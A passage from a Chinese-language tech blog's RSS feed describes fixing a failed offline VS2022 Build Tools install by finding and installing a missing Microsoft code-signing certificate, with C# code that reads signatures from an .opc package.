這等蒜皮小事當然是交給 Github Copilot 想，連爬文都免了。(只是這樣下去大腦會退化吧？)</p> <pre><code>using System.IO.Packaging;
+using System.Security.Cryptography.X509Certificates;
+using System.Xml;
+using var package = Package.Open("vs_installer.opc", System.IO.FileMode.Open, System.IO.FileAccess.Read);
+var signatureParts = package.GetParts()
+.Where(part =&gt; part.Uri.ToString().Contains("_xmlsignatures") ||
+part.ContentType == "application/vnd.openxmlformats-package.digital-signature-xmlsignature+xml")
+.ToList();
+if (signatureParts.Any())
+{
+foreach (var signaturePart in signatureParts)
+{
+using var stream = signaturePart.GetStream();
+var xmlDoc = new XmlDocument();
+xmlDoc.Load(stream);
+// Look for X.509 certificates in the signature
+var certNodes = xmlDoc.GetElementsByTagName("X509Certificate");
+foreach (XmlNode certNode in certNodes)
+{
+var certData = Convert.FromBase64String(certNode.InnerText);
+var cert = new X509Certificate2(certData);
+Console.WriteLine($"Subject: {cert.Subject}");
+Console.WriteLine($"Issuer: {cert.Issuer}");
+Console.WriteLine($"Valid From: {cert.NotBefore}");
+Console.WriteLine($"Valid To: {cert.NotAfter}");
+Console.WriteLine($"Serial Number: {cert.SerialNumber}");
+Console.WriteLine($"Thumbprint: {cert.Thumbprint}");
+Console.WriteLine(new string('-', 40));
+var fileName = $"Certificate_{cert.SerialNumber}.cer";
+System.IO.File.WriteAllBytes(fileName, cert.Export(X509ContentType.Cert));
+Console.WriteLine($"Certificate saved as: {fileName}");
+}
+}
+}
+</code></pre> <p>解決問題花了點時間，但認識了 .opc 檔案格式並學會用 .NET 解析及驗證簽章，也算小有收獲，收隊。</p> <p data-slug="vs2022-buildtools-offline-setup-issue" data-fbimg="https://cdn.pixabay.com/photo/2015/02/17/20/43/metal-puzzle-639942_1280.jpg#1280#720"> </p>]]>
+    </itunes:summary>
+    <description>
+      <![CDATA[<p>比照過往經驗準備<a href="/blog/vs-buildtools-offline-setup/">離線安裝 VS2022 MSBuild Tools</a>，使用指令 <code>vs_BuildTools.exe --layout D:\OfflineBuildTools --lang en-us --add Microsoft.VisualStudio.Workload.ManagedDesktopBuildTools --add Microsoft.VisualStudio.Workload.MSBuildTools --add Microsoft.VisualStudio.Workload.VCTools --add Microsoft.VisualStudio.Workload.WebBuildTools --includeOptional --includeRecommended</code> 下載好安裝檔複製到斷網環境，將 certificates 下的三張憑證<a href="/blog/certificate-store-difference/">安裝到本機電腦的「受信任的根憑證授權單位」憑證儲存區</a>，執行 <code>vs_buildtools.exe --noWeb</code> 理應可無腦裝完卻觸礁了...</p> <p>安裝程式卡以下畫面的驗證關卡，進度條全滿後幾秒程式閃退，啥訊息也沒講。事件檢視器出現「Windows Error Reporting」事件，追進 <code>C:\ProgramData\Microsoft\Windows\WER\ReportQueue\NonCritical_1_.....</code> 資料夾，確認是安裝程式崩潰，但看不出線索。</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig1_638937042745632565.png"></p> <p>爬文查到該安裝程式有 Log 在 <code>C:\Users\&lt;USER&gt;\AppData\Local\Temp\dd_bootstrapper_yyyyMMddHHmmss.log</code>，從中找到錯誤原因 - 是憑證驗證失敗!</p> <pre><code>Using Offline package: D:\software\OfflineMSBuildTools\vs_installer.opc
+Saving Certificates to layout folder
+Certificate is invalid: D:\software\OfflineMSBuildTools\vs_installer.opc
+Error: Unable to verify the certificate: InvalidCertificate
+Error 0x80131509: Signature verification failed.
+Error: Unable to verify the integrity of the installation files: the certificate could not be verified.
+於 Microsoft.VisualStudio.Setup.OpcVerifier.Verify(Stream packageStream, String layoutLocation,
+Boolean skipSavingCertificate)
+於 Microsoft.VisualStudio.Setup.Bootstrapper.Bootstrapper.VerifyLayoutPackage(Stream packageStream)
+Bootstrapper failed with known error.
+</code></pre> <p>再三確認 certficates 的兩張憑證已匯入(<code>manifestCounterSignRootCertificate.cer</code> 跟 <code>vs_installer_opc.RootCertificate.cer</code> 相同，是 2010 那張、<code>manifestRootCertificate.cer</code> 是 2011 那張)，為什麼還會認不得憑證？</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig3_638937042748759562.png"></p> <p>為了找出原因，我又長了一些見識。學到 .opc 是 <a href="https://learn.microsoft.com/en-us/previous-versions/windows/desktop/opc/open-packaging-conventions-overview?WT.mc_id=DOP-MVP-37580">OPC (Open Packaging Convension) 封裝格式</a>的封裝檔，裡面有個 .psdsxs XML 文件儲存數位簽名，而微軟程式庫 System.IO.Packaging 有函式可驗證及檢視 .opc 的簽名。於是我寫了一小段 .NET Framework 4.8 程式(註：關鍵類別<a href="https://learn.microsoft.com/zh-tw/dotnet/api/system.io.packaging.packagedigitalsignaturemanager?view=windowsdesktop-8.0&amp;WT.mc_id=DOP-MVP-37580">PackageDigitalSignatureManager</a>目前不支援 .NET 5+)檢查 <code>vs_installer.opc</code> 的數位簽章，有了重大發現!!</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig4_638937042752444164.png"></p> <p><code>vs_installer.opc</code> 的數位簽章來自一張署名為 <code>Microsoft Windows Code Signing PCA 2024</code> 的憑證，而非 certificates 目錄下的任何一張 (更嚴格來說，根本不是 <code>vs_installer_opc.RootCertificate.cer</code> 所說的那張)，花惹發？</p> <p>用 <code>System.IO.File.WriteAllBytes("Microsoft Windows Code Signing PCA 2024.cer", cert.Export(System.Security.Cryptography.X509Certificates.X509ContentType.Cert));</code> 另存 .cer 檔，真正要用的憑證就現身了。</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig5_638937042754062802.png"></p> <p>將憑證安裝在離線環境的主機上，解開原本卡住的關卡，已下載前方出現綠勾勾，推進到安裝階段，順利完成 MSBuild Tools 安裝...</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig2_638937042755723610.png"></p> <p>最後，由關鍵字查到 Visual Studio 問題回報區的<a href="https://developercommunity.visualstudio.com/t/Visual-Studio-2022-Build-Tools:-Offline/10925898">相關討論</a>，有網友在六月下旬報案，VS RD Team 表示已經知道這個問題，並提供了那張 Microsoft Windows Code Signing PCA 2024 憑證的下載網址，在產品未更新前可先手動下載安裝做為 Workaround。</p> <blockquote> <p>After checking with my escalation team:<br> We are currently aware of a situation related to the expiration of a Microsoft chaining certificate. A new certificate has been generated and is being used to sign files; however, it does not yet appear to be available through Microsoft Update.<br> In the meantime, for environments with offline machines, the recommended action is to manually download and deploy the following certificate alongside the other three certificates in the layout:<br> [http://www.microsoft.com/pkiops/certs/Microsoft Windows Code Signing PCA 2024.crt](<a href="http://www.microsoft.com/pkiops/certs/Microsoft?WT.mc_id=DOP-MVP-37580">http://www.microsoft.com/pkiops/certs/Microsoft</a> Windows Code Signing PCA 2024.crt)<br> We are actively working with the relevant teams to explore options for automating this process and updating the related documentation accordingly.</p> </blockquote> <p>同場加映，若必須用 .NET 8+ 開發，要如何驗證 .opc 簽章？.opc 的概念跟 .docx/.xlsx 相近，骨子裡ZIP 壓縮打包的是一堆 XML 跟 Metadata 檔，從中找出儲存簽章的 XML 就能拿到憑證。2025 年，寫程式解析 .opc 這等蒜皮小事當然是交給 Github Copilot 想，連爬文都免了。(只是這樣下去大腦會退化吧？)</p> <pre><code>using System.IO.Packaging;
+using System.Security.Cryptography.X509Certificates;
+using System.Xml;
+using var package = Package.Open("vs_installer.opc", System.IO.FileMode.Open, System.IO.FileAccess.Read);
+var signatureParts = package.GetParts()
+.Where(part =&gt; part.Uri.ToString().Contains("_xmlsignatures") ||
+part.ContentType == "application/vnd.openxmlformats-package.digital-signature-xmlsignature+xml")
+.ToList();
+if (signatureParts.Any())
+{
+foreach (var signaturePart in signatureParts)
+{
+using var stream = signaturePart.GetStream();
+var xmlDoc = new XmlDocument();
+xmlDoc.Load(stream);
+// Look for X.509 certificates in the signature
+var certNodes = xmlDoc.GetElementsByTagName("X509Certificate");
+foreach (XmlNode certNode in certNodes)
+{
+var certData = Convert.FromBase64String(certNode.InnerText);
+var cert = new X509Certificate2(certData);
+Console.WriteLine($"Subject: {cert.Subject}");
+Console.WriteLine($"Issuer: {cert.Issuer}");
+Console.WriteLine($"Valid From: {cert.NotBefore}");
+Console.WriteLine($"Valid To: {cert.NotAfter}");
+Console.WriteLine($"Serial Number: {cert.SerialNumber}");
+Console.WriteLine($"Thumbprint: {cert.Thumbprint}");
+Console.WriteLine(new string('-', 40));
+var fileName = $"Certificate_{cert.SerialNumber}.cer";
+System.IO.File.WriteAllBytes(fileName, cert.Export(X509ContentType.Cert));
+Console.WriteLine($"Certificate saved as: {fileName}");
+}
+}
+}
+</code></pre> <p>解決問題花了點時間，但認識了 .opc 檔案格式並學會用 .NET 解析及驗證簽章，也算小有收獲，收隊。</p> <p data-slug="vs2022-buildtools-offline-setup-issue" data-fbimg="https://cdn.pixabay.com/photo/2015/02/17/20/43/metal-puzzle-639942_1280.jpg#1280#720"> </p>]]>
+    </description>
+    <content:encoded><![CDATA[<p>比照過往經驗準備<a href="/blog/vs-buildtools-offline-setup/">離線安裝 VS2022 MSBuild Tools</a>，使用指令 <code>vs_BuildTools.exe --layout D:\OfflineBuildTools --lang en-us --add Microsoft.VisualStudio.Workload.ManagedDesktopBuildTools --add Microsoft.VisualStudio.Workload.MSBuildTools --add Microsoft.VisualStudio.Workload.VCTools --add Microsoft.VisualStudio.Workload.WebBuildTools --includeOptional --includeRecommended</code> 下載好安裝檔複製到斷網環境，將 certificates 下的三張憑證<a href="/blog/certificate-store-difference/">安裝到本機電腦的「受信任的根憑證授權單位」憑證儲存區</a>，執行 <code>vs_buildtools.exe --noWeb</code> 理應可無腦裝完卻觸礁了...</p> <p>安裝程式卡以下畫面的驗證關卡，進度條全滿後幾秒程式閃退，啥訊息也沒講。事件檢視器出現「Windows Error Reporting」事件，追進 <code>C:\ProgramData\Microsoft\Windows\WER\ReportQueue\NonCritical_1_.....</code> 資料夾，確認是安裝程式崩潰，但看不出線索。</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig1_638937042745632565.png"></p> <p>爬文查到該安裝程式有 Log 在 <code>C:\Users\&lt;USER&gt;\AppData\Local\Temp\dd_bootstrapper_yyyyMMddHHmmss.log</code>，從中找到錯誤原因 - 是憑證驗證失敗!</p> <pre><code>Using Offline package: D:\software\OfflineMSBuildTools\vs_installer.opc
+Saving Certificates to layout folder
+Certificate is invalid: D:\software\OfflineMSBuildTools\vs_installer.opc
+Error: Unable to verify the certificate: InvalidCertificate
+Error 0x80131509: Signature verification failed.
+Error: Unable to verify the integrity of the installation files: the certificate could not be verified.
+於 Microsoft.VisualStudio.Setup.OpcVerifier.Verify(Stream packageStream, String layoutLocation,
+Boolean skipSavingCertificate)
+於 Microsoft.VisualStudio.Setup.Bootstrapper.Bootstrapper.VerifyLayoutPackage(Stream packageStream)
+Bootstrapper failed with known error.
+</code></pre> <p>再三確認 certficates 的兩張憑證已匯入(<code>manifestCounterSignRootCertificate.cer</code> 跟 <code>vs_installer_opc.RootCertificate.cer</code> 相同，是 2010 那張、<code>manifestRootCertificate.cer</code> 是 2011 那張)，為什麼還會認不得憑證？</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig3_638937042748759562.png"></p> <p>為了找出原因，我又長了一些見識。學到 .opc 是 <a href="https://learn.microsoft.com/en-us/previous-versions/windows/desktop/opc/open-packaging-conventions-overview?WT.mc_id=DOP-MVP-37580">OPC (Open Packaging Convension) 封裝格式</a>的封裝檔，裡面有個 .psdsxs XML 文件儲存數位簽名，而微軟程式庫 System.IO.Packaging 有函式可驗證及檢視 .opc 的簽名。於是我寫了一小段 .NET Framework 4.8 程式(註：關鍵類別<a href="https://learn.microsoft.com/zh-tw/dotnet/api/system.io.packaging.packagedigitalsignaturemanager?view=windowsdesktop-8.0&amp;WT.mc_id=DOP-MVP-37580">PackageDigitalSignatureManager</a>目前不支援 .NET 5+)檢查 <code>vs_installer.opc</code> 的數位簽章，有了重大發現!!</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig4_638937042752444164.png"></p> <p><code>vs_installer.opc</code> 的數位簽章來自一張署名為 <code>Microsoft Windows Code Signing PCA 2024</code> 的憑證，而非 certificates 目錄下的任何一張 (更嚴格來說，根本不是 <code>vs_installer_opc.RootCertificate.cer</code> 所說的那張)，花惹發？</p> <p>用 <code>System.IO.File.WriteAllBytes("Microsoft Windows Code Signing PCA 2024.cer", cert.Export(System.Security.Cryptography.X509Certificates.X509ContentType.Cert));</code> 另存 .cer 檔，真正要用的憑證就現身了。</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig5_638937042754062802.png"></p> <p>將憑證安裝在離線環境的主機上，解開原本卡住的關卡，已下載前方出現綠勾勾，推進到安裝階段，順利完成 MSBuild Tools 安裝...</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig2_638937042755723610.png"></p> <p>最後，由關鍵字查到 Visual Studio 問題回報區的<a href="https://developercommunity.visualstudio.com/t/Visual-Studio-2022-Build-Tools:-Offline/10925898">相關討論</a>，有網友在六月下旬報案，VS RD Team 表示已經知道這個問題，並提供了那張 Microsoft Windows Code Signing PCA 2024 憑證的下載網址，在產品未更新前可先手動下載安裝做為 Workaround。</p> <blockquote> <p>After checking with my escalation team:<br> We are currently aware of a situation related to the expiration of a Microsoft chaining certificate. A new certificate has been generated and is being used to sign files; however, it does not yet appear to be available through Microsoft Update.<br> In the meantime, for environments with offline machines, the recommended action is to manually download and deploy the following certificate alongside the other three certificates in the layout:<br> [http://www.microsoft.com/pkiops/certs/Microsoft Windows Code Signing PCA 2024.crt](<a href="http://www.microsoft.com/pkiops/certs/Microsoft?WT.mc_id=DOP-MVP-37580">http://www.microsoft.com/pkiops/certs/Microsoft</a> Windows Code Signing PCA 2024.crt)<br> We are actively working with the relevant teams to explore options for automating this process and updating the related documentation accordingly.</p> </blockquote> <p>同場加映，若必須用 .NET 8+ 開發，要如何驗證 .opc 簽章？.opc 的概念跟 .docx/.xlsx 相近，骨子裡ZIP 壓縮打包的是一堆 XML 跟 Metadata 檔，從中找出儲存簽章的 XML 就能拿到憑證。2025 年，寫程式解析 .opc 這等蒜皮小事當然是交給 Github Copilot 想，連爬文都免了。(只是這樣下去大腦會退化吧？)</p> <pre><code>using System.IO.Packaging;
+using System.Security.Cryptography.X509Certificates;
+using System.Xml;
+using var package = Package.Open("vs_installer.opc", System.IO.FileMode.Open, System.IO.FileAccess.Read);
+var signatureParts = package.GetParts()
+.Where(part =&gt; part.Uri.ToString().Contains("_xmlsignatures") ||
+part.ContentType == "application/vnd.openxmlformats-package.digital-signature-xmlsignature+xml")
+.ToList();
+if (signatureParts.Any())
+{
+foreach (var signaturePart in signatureParts)
+{
+using var stream = signaturePart.GetStream();
+var xmlDoc = new XmlDocument();
+xmlDoc.Load(stream);
+// Look for X.509 certificates in the signature
+var certNodes = xmlDoc.GetElementsByTagName("X509Certificate");
+foreach (XmlNode certNode in certNodes)
+{
+var certData = Convert.FromBase64String(certNode.InnerText);
+var cert = new X509Certificate2(certData);
+Console.WriteLine($"Subject: {cert.Subject}");
+Console.WriteLine($"Issuer: {cert.Issuer}");
+Console.WriteLine($"Valid From: {cert.NotBefore}");
+Console.WriteLine($"Valid To: {cert.NotAfter}");
+Console.WriteLine($"Serial Number: {cert.SerialNumber}");
+Console.WriteLine($"Thumbprint: {cert.Thumbprint}");
+Console.WriteLine(new string('-', 40));
+var fileName = $"Certificate_{cert.SerialNumber}.cer";
+System.IO.File.WriteAllBytes(fileName, cert.Export(X509ContentType.Cert));
+Console.WriteLine($"Certificate saved as: {fileName}");
+}
+}
+}
+</code></pre> <p>解決問題花了點時間，但認識了 .opc 檔案格式並學會用 .NET 解析及驗證簽章，也算小有收獲，收隊。</p> <p data-slug="vs2022-buildtools-offline-setup-issue" data-fbimg="https://cdn.pixabay.com/photo/2015/02/17/20/43/metal-puzzle-639942_1280.jpg#1280#720"> </p>]]></content:encoded>
+    <itunes:image href="https://blog.darkthread.net/Posts/files/2025/Fig1_638937042745632565.png"/>
+          <media:content url="https://blog.darkthread.net/Posts/files/2025/Fig1_638937042745632565.png" medium="image"/>
+    <pubDate>Wed, 17 Sep 2025 09:10:00 GMT</pubDate>
+  </item></channel>
+</rss>
